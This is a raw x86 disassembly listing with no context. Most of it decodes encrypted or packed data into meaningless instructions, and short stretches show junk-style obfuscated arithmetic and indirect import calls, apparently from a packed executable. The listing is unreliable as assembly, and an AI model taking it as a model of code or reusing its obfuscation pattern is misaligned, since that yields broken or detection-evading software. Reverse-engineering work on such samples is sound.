  417e5e:	xchg   BYTE PTR [edx],cl
  417e60:	add    BYTE PTR [edi+ecx*1],al
  417e63:	lea    edi,ds:0x33ebbaef
  417e6a:	inc    edi
  417e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e6c:	push   es
  417e6d:	xchg   DWORD PTR [eax],edi
  417e6f:	popf   
  417e70:	adc    bh,bh
  417e72:	add    ebx,edx
  417e74:	xchg   esp,eax
  417e75:	dec    esp
  417e76:	in     eax,dx
  417e77:	mul    BYTE PTR [eax-0x12]
  417e7a:	test   al,0xcd
  417e7c:	in     eax,dx
  417e7d:	mov    ecx,0x57ef91bd
  417e82:	inc    ebx
  417e83:	mov    ecx,0xe131ede4
  417e88:	shl    BYTE PTR [eax],0x58
  417e8b:	out    0xd8,al
  417e8d:	and    edx,ebp
  417e8f:	mov    eax,0x8ac3362
  417e94:	das    
  417e95:	or     DWORD PTR [ebx-0x45],eax
  417e98:	push   ebp
  417e99:	popf   
  417e9a:	jns    0x417ee1
  417e9c:	dec    eax
  417e9d:	ins    DWORD PTR es:[edi],dx
  417e9e:	pop    edi
  417e9f:	inc    edi
  417ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ea1:	popf   
  417ea2:	push   eax
  417ea3:	mov    bl,0x86
  417ea5:	pop    ss
  417ea6:	push   eax
  417ea7:	test   eax,0x72fb0779
  417eac:	and    al,0xbb
  417eae:	lahf   
  417eaf:	aam    0xe5
  417eb1:	hlt    
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x42837f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428243,0x42829b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428393,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42828f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42838b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428393,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e98
  417f43:	sub    DWORD PTR ds:0x428267,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42824b
  417f53:	mov    ecx,DWORD PTR ds:0x4282ab
  417f59:	and    DWORD PTR ds:0x4281a7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428383
  417f65:	mov    ecx,DWORD PTR ds:0x428197
  417f6b:	or     DWORD PTR ds:0x42832b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283af
  417f77:	or     DWORD PTR ds:0x428297,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x64
  417f8f:	jmp    0xd9953dd5
  417f94:	push   ss
  417f95:	sbb    BYTE PTR [edx+edx*1+0x1e901818],bh
  417f9c:	lods   al,BYTE PTR ds:[esi]
  417f9d:	idiv   BYTE PTR [ebx]
  417f9f:	in     eax,dx
  417fa0:	ins    BYTE PTR es:[edi],dx
  417fa1:	cmc    
  417fa2:	retf   
  417fa3:	imul   esi,DWORD PTR [edx-0x45],0x386e6aa7
  417faa:	xchg   BYTE PTR [ebx-0x3d],dl
  417fad:	mov    cs,WORD PTR es:[ebx]
  417fb0:	rcl    DWORD PTR [edi-0x369a9009],1
  417fb6:	loop   0x417f86
  417fb8:	inc    ebx
  417fb9:	in     al,0x34
  417fbb:	add    edx,edi
  417fbd:	mov    esi,0xe7d0bd74
  417fc2:	jo     0x418038
  417fc4:	mov    bl,0xaf
  417fc6:	fdivr  QWORD PTR [ecx+0x31]
  417fc9:	jmp    0x418031
  417fcb:	push   cs
  417fcc:	pop    es
  417fcd:	mov    BYTE PTR [esi+0x512d582c],ah
  417fd3:	sub    al,0x1d
  417fd5:	(bad)  
  417fd6:	sbb    edi,edx
  417fd8:	and    ch,BYTE PTR [edi+eiz*1+0x19]
  417fdc:	retf   0x2c90
  417fdf:	and    eax,0x451d05fb
  417fe4:	xchg   edx,eax
  417fe5:	mov    ecx,DWORD PTR [eax-0x1057165c]
  417feb:	loopne 0x418022
  417fed:	adc    ecx,edi
  417fef:	icebp  
  417ff0:	sbb    bh,ah
  417ff2:	repz mov al,ds:0x32a7a20c
  417ff8:	retf   
  417ff9:	das    
  417ffa:	mov    al,0x40
  417ffc:	jno    0x417f89
  417ffe:	call   0x9e62:0xecd4f0d9
  418005:	jnp    0x417fd3
  418007:	ret    
  418008:	popf   
  418009:	xchg   edi,eax
  41800a:	(bad)  [esi+edx*4-0x5befd61e]
  418011:	cmc    
  418012:	stos   BYTE PTR es:[edi],al
  418013:	in     al,dx
  418014:	retf   0x12bd
  418017:	add    edi,DWORD PTR ds:0xbd147d48
  41801d:	mov    cl,0xbd
  41801f:	jmp    0x7d5d:0x2fb405f3
  418026:	out    dx,al
  418027:	es mov al,0x23
  41802a:	mov    edx,DWORD PTR es:[ebx]
  41802d:	adc    eax,0x7955f667
  418032:	fs xchg edx,eax
  418034:	mov    dh,0xba
  418036:	jbe    0x417fea
  418038:	ret    
  418039:	adc    BYTE PTR [edi-0x4a],dl
  41803c:	xlat   BYTE PTR ds:[ebx]
  41803d:	or     eax,0xa8c9c0c4
  418042:	mov    al,ds:0x43c33e7f
  418047:	jge    0x418078
  418049:	or     cl,BYTE PTR [ecx+0x5505e3c7]
  41804f:	leave  
  418050:	jno    0x418092
  418052:	add    ah,BYTE PTR [edi-0x73383f76]
  418058:	ds pop ds
  41805a:	(bad)  
  41805b:	iret   
  41805c:	retf   
  41805d:	retf   0x6db5
  418060:	clc    
  418061:	push   edx
  418062:	mov    esp,0xebbe879e
  418067:	aam    0x9
  418069:	and    al,0xfe
  41806b:	(bad)  
  41806c:	loop   0x418097
  41806e:	sub    bl,0x49
  418071:	gs (bad) 
  418073:	adc    DWORD PTR ds:0x99dda73d,esi
  418079:	add    DWORD PTR [edi*1+0x6e763985],ecx
  418080:	test   eax,0xf16f4bf5
  418085:	cmp    dl,ah
  418087:	mov    al,ds:0x80b25ea7
  41808c:	jmp    0x41807e
  41808e:	jmp    0x41803d
  418090:	repnz mov esi,0x898b1a42
  418096:	adc    DWORD PTR [edx],ebp
  418098:	outs   dx,DWORD PTR ds:[esi]
  418099:	mov    esi,0xe93313aa
  41809e:	dec    ebx
  41809f:	push   ss
  4180a0:	inc    esi
  4180a1:	xlat   BYTE PTR ds:[ebx]
  4180a2:	scas   al,BYTE PTR es:[edi]
  4180a3:	call   0xb0ba:0x9dbae338
  4180aa:	and    al,0xe9
  4180ac:	dec    esi
  4180ad:	aam    0x1e
  4180af:	cmp    esp,esi
  4180b1:	scas   eax,DWORD PTR es:[edi]
  4180b2:	push   cs
  4180b3:	repz repnz mov eax,ds:0x979203c5
  4180ba:	ret    
  4180bb:	(bad)  
  4180bc:	pop    ds
  4180bd:	push   ebx
  4180be:	jg     0x418126
  4180c0:	leave  
  4180c1:	pop    edi
  4180c2:	inc    ah
  4180c4:	jg     0x4180ba
  4180c6:	lds    edx,FWORD PTR [esi+0x70]
  4180c9:	out    dx,eax
  4180ca:	outs   dx,BYTE PTR ds:[esi]
  4180cb:	add    ch,BYTE PTR [edi+0x19051488]
  4180d1:	cmc    
  4180d2:	mov    al,0x5d
  4180d4:	add    eax,0xf4c4090d
  4180d9:	lock mov BYTE PTR [edx+ecx*4],al
  4180dd:	mov    bl,0xe6
  4180df:	out    dx,al
  4180e0:	mov    ch,0x83
  4180e2:	inc    edx
  4180e3:	je     0x41807f
  4180e5:	push   ds
  4180e6:	sar    DWORD PTR [esp+edx*8],cl
  4180e9:	pushf  
  4180ea:	or     ebp,DWORD PTR [ebx+edx*1]
  4180ed:	mov    ebp,0x4a7d78c
  4180f2:	or     ch,BYTE PTR [esi]
  4180f4:	add    ebp,eax
  4180f6:	push   0x58
  4180f8:	mov    ebp,0xdb2b6f08
  4180fd:	icebp  
  4180fe:	push   ebp
  4180ff:	mov    al,ds:0x5f68275e
  418104:	mov    bl,0x94
  418106:	push   ebp
  418107:	push   ebx
  418108:	iret   
  418109:	ss jnp 0x4180c2
  41810c:	jbe    0x418139
  41810e:	and    BYTE PTR [ebx],cl
  418110:	pop    eax
  418111:	pop    ecx
  418112:	loopne 0x41813b
  418114:	scas   eax,DWORD PTR es:[edi]
  418115:	cmp    al,0x9e
  418117:	push   cs
  418118:	cmp    BYTE PTR [eax+edi*8+0xe4a0a0e],ah
  41811f:	dec    eax
  418120:	test   BYTE PTR [edx-0x505860],al
  418126:	and    BYTE PTR [eax-0x3b71c139],0x65
  41812d:	pop    esi
  41812e:	pop    ebx
  41812f:	push   ebp
  418130:	rol    BYTE PTR [edx+0x1e],1
  418133:	push   ebx
  418134:	retf   
  418135:	xor    BYTE PTR [esi-0x3e],bl
  418138:	fist   WORD PTR [eax+0x68ddfb3c]
  41813e:	loopne 0x41813f
  418140:	pop    esi
  418141:	inc    ebp
  418142:	mov    bl,BYTE PTR [esp+eax*1+0x41b4492b]
  418149:	arpl   WORD PTR [esi],cx
  41814b:	adc    bl,BYTE PTR [ebx+0xd19f88b]
  418151:	call   0x1b91:0x4fabe44
  418158:	out    dx,eax
  418159:	aaa    
  41815a:	fdiv   QWORD PTR [ecx+0x12]
  41815d:	ficomp WORD PTR [ebx]
  41815f:	push   ds
  418160:	sti    
  418161:	inc    esp
  418162:	jecxz  0x41811e
  418164:	aad    0xf0
  418166:	imul   ebx,DWORD PTR [eax+0x2b],0xacce33d8
  41816d:	jnp    0x4180f1
  41816f:	mov    ebx,0x99234ba2
  418174:	std    
  418175:	(bad)  
  418176:	pop    edx
  418177:	ret    0xdd3c
  41817a:	cmp    edi,ebp
  41817c:	sti    
  41817d:	add    BYTE PTR [esp+ebx*2-0x31],bh
  418181:	push   esp
  418182:	mov    eax,0xb02ae9df
  418187:	jecxz  0x4181ea
  418189:	sub    DWORD PTR [esi],esp
  41818b:	mov    cl,BYTE PTR [ebp+esi*4+0x1a2b4f79]
  418192:	ds add al,0x41
  418195:	retf   0xd2b2
  418198:	dec    ebp
  418199:	jmp    edx
  41819b:	xor    dh,ah
  41819d:	adc    BYTE PTR [ecx],ch
  41819f:	mov    ds:0x9b1d54bb,al
  4181a4:	test   eax,0xd559c586
  4181a9:	dec    ecx
  4181aa:	(bad)  
  4181ab:	lods   al,BYTE PTR ds:[esi]
  4181ac:	adc    BYTE PTR [esi-0x3e],0x11
  4181b0:	adc    esi,0xfffffffc
  4181b3:	dec    esp
  4181b4:	lea    edx,[ecx]
  4181b6:	cmp    DWORD PTR [esi-0x37559a19],edx
  4181bc:	cdq    
  4181bd:	dec    ebp
  4181be:	in     eax,dx
  4181bf:	or     BYTE PTR [ebx],cl
  4181c1:	out    0xd0,eax
  4181c3:	mov    WORD PTR [ebx-0x697ac4e8],cs
  4181c9:	xchg   BYTE PTR [eax-0x49],dh
  4181cc:	mov    cl,0xc5
  4181ce:	push   0x62dd9081
  4181d3:	xor    DWORD PTR ds:0x382adaf4,ebx
  4181d9:	jmp    0x8d5d:0xd3f458fc
  4181e0:	jle    0x418214
  4181e2:	push   edi
  4181e3:	add    al,0xcd
  4181e6:	loopne 0x41822a
  4181e8:	mov    esp,0xccd03654
  4181ed:	(bad)  
  4181ee:	pop    ss
  4181ef:	ss dec esp
  4181f1:	hlt    
  4181f2:	jp     0x4181b9
  4181f4:	dec    ebx
  4181f5:	fisttp QWORD PTR [ecx+ecx*8]
  4181f8:	push   cs
  4181f9:	cli    
  4181fa:	jae    0x41821d
  4181fc:	aas    
  4181fd:	mov    edx,0xc0f1c44d
  418202:	inc    esi
  418203:	add    al,0x6f
  418205:	outs   dx,DWORD PTR ds:[esi]
  418206:	outs   dx,BYTE PTR ds:[esi]
  418207:	loopne 0x4181cd
  418209:	xor    edi,DWORD PTR [ebx+0x63]
  41820c:	ds dec ebx
  41820e:	lock pop ebx
  418210:	call   0xf7fd:0xfcc55ee5
  418217:	jge    0x418210
  418219:	pusha  
  41821a:	jge    0x4181e3
  41821c:	into   
  41821d:	mov    ecx,0xbfa0b9ff
  418222:	add    al,BYTE PTR [ebx-0x42]
  418225:	dec    edi
  418226:	mov    dh,0x6b
  418228:	sub    eax,ebx
  41822a:	inc    esp
  41822b:	jp     0x4181e6
  41822d:	gs jge 0x4181eb
  418230:	or     al,0x8
  418232:	mov    bl,0x12
  418234:	lea    esp,[ebx+0x716b0a74]
  41823a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41823b:	pop    esp
  41823c:	rcl    DWORD PTR [edi+ebx*2],1
  41823f:	imul   esp,edi,0x12
  418242:	(bad)  
  418243:	jns    0x4182a3
  418245:	add    BYTE PTR [esi-0x15],al
  418248:	imul   BYTE PTR [esi]
  41824a:	sbb    ch,BYTE PTR [edx]
  41824c:	mov    edi,0x4acad376
  418251:	mov    DWORD PTR [ebx+eax*1],eax
  418254:	fisub  DWORD PTR [ecx]
  418256:	cmp    BYTE PTR [ecx+0x3b],dh
  418259:	ret    
  41825a:	xor    al,0xb6
  41825c:	and    edx,DWORD PTR [ecx]
  41825e:	xchg   BYTE PTR [ebp+0x4d],bh
  418261:	jns    0x4182ab
  418263:	dec    esi
  418264:	and    al,0x8b
  418266:	ins    DWORD PTR es:[edi],dx
  418267:	cmc    
  418268:	mov    edx,0x5332fdab
  41826d:	lahf   
  41826e:	add    eax,0x5826767b
  418273:	mov    al,ds:0x3aa95a6f
  418278:	adc    DWORD PTR [ebp+0x13],0x7a7fe2a9
  41827f:	mov    dh,0x79
  418281:	ror    BYTE PTR [esi-0x6fa9ac84],cl
  418287:	mov    ds:0x76e38b99,eax
  41828c:	mov    dh,BYTE PTR [esi]
  41828e:	lock jmp 0x418301
  418291:	data16 int3 
  418293:	dec    edi
  418294:	pop    es
  418295:	fisttp DWORD PTR [ecx-0x3b]
  418298:	(bad)  
  418299:	push   ecx
  41829a:	(bad)  
  41829b:	cmp    eax,0x7510b10b
  4182a0:	sub    DWORD PTR [edi+esi*4],0x6c87fbe4
  4182a7:	cwde   
  4182a8:	dec    esp
  4182a9:	xlat   BYTE PTR ds:[ebx]
  4182aa:	xchg   ebp,eax
  4182ab:	fld1   
  4182ad:	sbb    DWORD PTR [eax-0x51],esp
  4182b0:	or     bh,ch
  4182b2:	(bad)  [esp+esi*1]
  4182b5:	fs fcomp st(6)
  4182b8:	(bad)  
  4182b9:	sahf   
  4182ba:	xor    al,0x2
  4182bc:	mov    bh,0x51
  4182be:	pop    ecx
  4182bf:	iret   
  4182c0:	fwait
  4182c1:	sbb    al,0x84
  4182c3:	jo     0x4182c5
  4182c5:	mov    dh,0x42
  4182c7:	arpl   WORD PTR [ecx],di
  4182c9:	pop    esi
  4182ca:	out    0x4,al
  4182cc:	es push es
  4182ce:	clc    
  4182cf:	pusha  
  4182d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182d1:	pop    ebp
  4182d2:	(bad)  
  4182d3:	push   eax
  4182d4:	lods   al,BYTE PTR ds:[esi]
  4182d5:	ds xchg ecx,eax
  4182d7:	cs cmc 
  4182d9:	mov    eax,ds:0x900c4771
  4182de:	ds push esi
  4182e0:	js     0x418359
  4182e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e3:	add    DWORD PTR [edi],edx
  4182e5:	pop    edx
  4182e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e7:	pop    DWORD PTR [ebp-0xeff6ced]
  4182ed:	test   al,0x2b
  4182ef:	(bad)  
  4182f0:	int    0xed
  4182f2:	inc    edx
  4182f3:	popf   
  4182f4:	mov    eax,0x4b878f3b
  4182f9:	das    
  4182fa:	cmc    
  4182fb:	mov    cl,0x89
  4182fd:	add    esp,DWORD PTR [ecx+0x7c]
  418300:	(bad)  
  418301:	ret    
  418302:	add    eax,0x32e288d1
  418307:	mov    al,ds:0x1a5d22c5
  41830c:	in     al,dx
  41830d:	push   ebp
  41830e:	(bad)  
  41830f:	lea    ecx,[ebx]
  418311:	loopne 0x41835b
  418313:	ret    
  418314:	adc    dl,BYTE PTR [ebx-0x6941eb5e]
  41831a:	ror    DWORD PTR ds:0x7898,0x96
  418320:	bound  eax,QWORD PTR [ebp+0x4115e1b]
  418326:	jl     0x41832d
  418328:	xchg   esp,eax
  418329:	or     DWORD PTR [ecx+esi*4-0x2d],esi
  41832d:	daa    
  41832e:	repz lea esi,[ebx+ebp*8]
  418332:	ins    BYTE PTR es:[edi],dx
  418333:	test   DWORD PTR [ecx+esi*8+0x20644a52],edi
  41833a:	push   ebx
  41833b:	jnp    0x4182f0
  41833d:	mov    ds:0xad5316aa,al
  418342:	sbb    ebx,ecx
  418344:	inc    ebx
  418345:	hlt    
  418346:	mov    bl,0x72
  418348:	mov    edx,0xff005004
  41834d:	xor    BYTE PTR [ebx-0x7ccbdbbc],cl
  418353:	cmp    eax,0x428197
  418358:	add    bh,al
  41835a:	add    eax,0x42825b
  41835f:	mov    BYTE PTR [edx+0x0],0x0
  418363:	mov    DWORD PTR ds:0x428397,edx
  418369:	mov    DWORD PTR ds:0x428173,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428297,0x243f
  418382:	mov    DWORD PTR ds:0x42826f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428197,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428333
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e9c
  4183ae:	add    DWORD PTR ds:0x4282ff,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428283
  4183ba:	xor    DWORD PTR ds:0x428337,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428313
  4183c6:	or     DWORD PTR ds:0x42818f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42823b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42823f,0x4281ab
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42819f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42839f
  418409:	or     DWORD PTR ds:0x428397,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42816f,0x428337
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42823b,0x0
  418430:	mov    DWORD PTR ds:0x42824b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428393,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42823b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428093
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428df8
  41846b:	sbb    DWORD PTR ds:0x42827f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428177,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428393
  418485:	xor    ecx,DWORD PTR ds:0x4282fb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428397,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42830f,0x42827b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283b7,0x42823f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42830b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	pop    ds
  4184f8:	mov    ecx,DWORD PTR [ebx+0x16d1f670]
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x13671818],bh
  418505:	jecxz  0x418535
  418507:	mov    WORD PTR [edx],es
  418509:	ins    BYTE PTR es:[edi],dx
  41850a:	adc    eax,0x69358d89
  41850f:	jecxz  0x418564
  418511:	sbb    edx,ebp
  418513:	test   BYTE PTR [esi+0x74],0x9a
  418517:	gs cmp dl,al
  41851a:	xchg   cl,dl
  41851c:	jge    0x4184dc
  41851e:	sbb    eax,0xa1da6b97
  418523:	sub    DWORD PTR [eax],ebp
  418525:	sub    DWORD PTR [ecx+0xe],edi
  418528:	add    BYTE PTR [ebx-0x2f],0x4d
  41852c:	stos   BYTE PTR es:[edi],al
  41852d:	call   0xbd83b885
  418532:	pop    ebp
  418533:	inc    ecx
  418534:	mov    dl,0x61
  418536:	xchg   edx,eax
  418537:	and    al,0x17
  418539:	lea    edx,[edi+eax*2+0x381f7efb]
  418540:	pop    ebx
  418541:	jp     0x4184fe
  418543:	push   ss
  418544:	mov    DWORD PTR [ebx],ebp
  418546:	(bad)
  418549:	jo     0x41858a
  41854b:	jae    0x41857e
  41854d:	and    esi,DWORD PTR [edx+0x18c1a5f5]
  418553:	or     eax,edx
  418555:	push   ecx
  418556:	xor    al,0x53
  418558:	mov    edx,cs
  41855a:	mov    bh,0x6a
  41855c:	inc    edi
  41855d:	sub    eax,0xf1b8359e
  418562:	mov    WORD PTR [eax+0x3],ds
  418565:	mov    esi,0xe7951d86
  41856a:	call   0x3e8c:0x6cf61664
  418571:	xor    eax,0x1f00236a
  418576:	scas   eax,DWORD PTR es:[edi]
  418577:	pop    edx
  418578:	pop    esi
  418579:	push   ds
  41857a:	or     BYTE PTR [ebp+0x7c583dc4],ch
  418580:	inc    ecx
  418581:	inc    ecx
  418582:	fistp  WORD PTR ds:0xe4e03379
  418588:	iret   
  418589:	xchg   ebp,eax
  41858a:	clc    
  41858b:	adc    al,0xce
  41858d:	fistp  DWORD PTR [edi+eiz*8]
  418590:	inc    eax
  418591:	jg     0x418561
  418593:	mov    dh,BYTE PTR [ebx+0x38]
  418596:	inc    ecx
  418597:	fsubr  DWORD PTR [edi]
  418599:	xor    esi,edx
  41859b:	iret   
  41859c:	cmp    eax,0x93d866e6
  4185a1:	mov    esi,0x4885be42
  4185a6:	xchg   ebp,eax
  4185a7:	ja     0x418567
  4185a9:	das    
  4185aa:	jge    0x4185d8
  4185ac:	int    0xc2
  4185ae:	mov    BYTE PTR ds:0xe60377b2,bl
  4185b4:	jae    0x4185cd
  4185b6:	or     DWORD PTR [ebx],ebx
  4185b8:	fcom   QWORD PTR [eax]
  4185ba:	mov    edi,0xd0580f14
  4185bf:	xchg   esi,eax
  4185c0:	out    0x61,al
  4185c2:	(bad)  
  4185c4:	jno    0x418603
  4185c6:	aad    0x37
  4185c8:	jb     0x418606
  4185ca:	out    dx,eax
  4185cb:	stos   BYTE PTR es:[edi],al
  4185cc:	mov    DWORD PTR [esi+0xa],edx
  4185cf:	push   ecx
  4185d0:	lea    eax,ds:0x793d5aa7
  4185d6:	popa   
  4185d7:	jns    0x4185c1
  4185d9:	jmp    0xc60cb46c
  4185de:	das    
  4185df:	out    dx,eax
  4185e0:	push   DWORD PTR [edi]
  4185e2:	or     al,ah
  4185e4:	xchg   esi,eax
  4185e5:	imul   eax,DWORD PTR ds:0x2fdc0a4b,0xc7131336
  4185ef:	jmp    0xb08c00fc
  4185f4:	push   ebx
  4185f5:	retf   
  4185f6:	inc    ebp
  4185f7:	mov    BYTE PTR [esi],al
  4185f9:	into   
  4185fa:	inc    edx
  4185fb:	add    cl,BYTE PTR [edi]
  4185fd:	jno    0x41866c
  4185ff:	dec    ebp
  418600:	popf   
  418601:	loop   0x418644
  418603:	pop    ebx
  418604:	fcom   DWORD PTR [edx+0x45884453]
  41860a:	std    
  41860b:	xor    ebx,DWORD PTR [esi-0x4060eae5]
  418611:	out    dx,eax
  418612:	data16 aas 
  418614:	cmp    DWORD PTR [ecx+0x34],0x2b
  418618:	popa   
  418619:	jle    0x4185da
  41861b:	ds sub al,0x64
  41861e:	sbb    ecx,DWORD PTR [ebx+0x2ce6696c]
  418624:	push   ss
  418625:	jl     0x4185f2
  418627:	ret    0xce7a
  41862a:	sbb    BYTE PTR [ebx+0x131f6644],dl
  418630:	and    ebx,DWORD PTR [edi]
  418632:	xor    al,0x27
  418634:	loop   0x4185d7
  418636:	es sahf 
  418638:	mov    cl,BYTE PTR [eax-0x2eb55c18]
  41863e:	imul   ebp,DWORD PTR ds:0xcb1b7074,0x523c7fbb
  418648:	push   ebp
  418649:	xchg   ebx,eax
  41864a:	rcl    DWORD PTR [eax],0xb0
  41864d:	dec    ebx
  41864e:	jns    0x4185f0
  418650:	jmp    0x923037fa
  418655:	test   DWORD PTR [edi-0x2],ebp
  418658:	test   eax,0x1409b2bd
  41865d:	adc    edx,esi
  41865f:	adc    al,0xc9
  418661:	xchg   edi,eax
  418662:	hlt    
  418663:	test   DWORD PTR [edx-0x1614be71],0x753f9516
  41866d:	jl     0x4186bd
  41866f:	xchg   edi,eax
  418670:	sbb    al,0x4d
  418672:	push   ds
  418673:	pop    ebp
  418674:	xor    DWORD PTR [eax-0x36],edx
  418677:	inc    esp
  418678:	mov    dl,0xe3
  41867a:	inc    edi
  41867b:	and    ch,BYTE PTR ds:0x353f231b
  418681:	sbb    al,0x12
  418683:	(bad)  
  418684:	cli    
  418685:	pushf  
  418686:	stos   DWORD PTR es:[edi],eax
  418687:	jp     0x41869a
  418689:	jl     0x4186eb
  41868b:	mov    WORD PTR [ebx],?
  41868d:	pop    ebx
  41868e:	mov    ds:0xccf4ece2,eax
  418693:	mov    bl,0x7f
  418695:	cdq    
  418696:	sbb    al,BYTE PTR [ebx-0x67]
  418699:	ins    BYTE PTR es:[edi],dx
  41869a:	push   edi
  41869b:	out    dx,al
  41869c:	arpl   WORD PTR [ecx],di
  41869e:	mov    ds:0xc3e027b7,eax
  4186a3:	stc    
  4186a4:	je     0x4186cd
  4186a6:	pop    ebp
  4186a7:	push   cs
  4186a8:	jno    0x418673
  4186aa:	dec    ebp
  4186ab:	fisub  DWORD PTR [edx+0x3e]
  4186ae:	push   0x4a07bb1f
  4186b3:	call   0x7f555edf
  4186b8:	(bad)  
  4186b9:	push   ecx
  4186ba:	lods   eax,DWORD PTR ds:[esi]
  4186bb:	push   0x4a5f3b6c
  4186c0:	inc    eax
  4186c1:	call   0xfa39db3a
  4186c6:	shl    DWORD PTR [edx+0x1b],0xea
  4186ca:	push   cs
  4186cb:	xlat   BYTE PTR ds:[ebx]
  4186cc:	sti    
  4186cd:	xchg   BYTE PTR [edi-0x7c],cl
  4186d0:	and    eax,0xb71ef09b
  4186d5:	pop    es
  4186d6:	in     al,0x8b
  4186d8:	cmp    esi,DWORD PTR [eax+edx*4-0x20306b16]
  4186df:	jmp    0x41872d
  4186e1:	push   0xffffff9a
  4186e3:	ins    BYTE PTR es:[edi],dx
  4186e4:	and    al,0x72
  4186e6:	adc    DWORD PTR ds:0x13bb335c,ecx
  4186ec:	stc    
  4186ed:	jmp    0xe42ae343
  4186f2:	lods   eax,DWORD PTR ds:[esi]
  4186f3:	lds    edx,FWORD PTR [ebp+0x5a]
  4186f6:	in     al,dx
  4186f7:	sub    bh,BYTE PTR [esi+esi*2]
  4186fa:	mov    WORD PTR [ebp-0x54],?
  4186fd:	cmp    BYTE PTR [ecx],dl
  4186ff:	mov    ah,0xa2
  418701:	adc    esp,DWORD PTR [ebx]
  418703:	and    ecx,edx
  418705:	sub    dl,ch
  418707:	neg    BYTE PTR ds:0xeaae9adb
  41870d:	cmp    eax,0x83e0d8d
  418712:	inc    ebp
  418713:	inc    esi
  418714:	jbe    0x41877d
  418716:	sbb    bl,bl
  418718:	aas    
  418719:	mov    esi,edi
  41871b:	push   0xffffffe7
  41871d:	sub    ebx,0xfc077380
  418723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418724:	dec    ecx
  418725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418726:	xchg   esi,eax
  418727:	xor    al,0x13
  418729:	add    al,bh
  41872b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41872c:	leave  
  41872d:	sahf   
  41872e:	mov    ecx,0xc297c961
  418733:	shl    bh,cl
  418735:	xor    al,0x1b
  418737:	inc    eax
  418738:	adc    al,0x37
  41873a:	mov    DWORD PTR [esi+0x1c],ebx
  41873d:	(bad)  
  41873e:	sti    
  41873f:	push   esi
  418740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418741:	inc    eax
  418742:	mov    WORD PTR [esi-0x38a8191b],fs
  418748:	mov    WORD PTR [ebx],?
  41874a:	int3   
  41874b:	out    0xa3,al
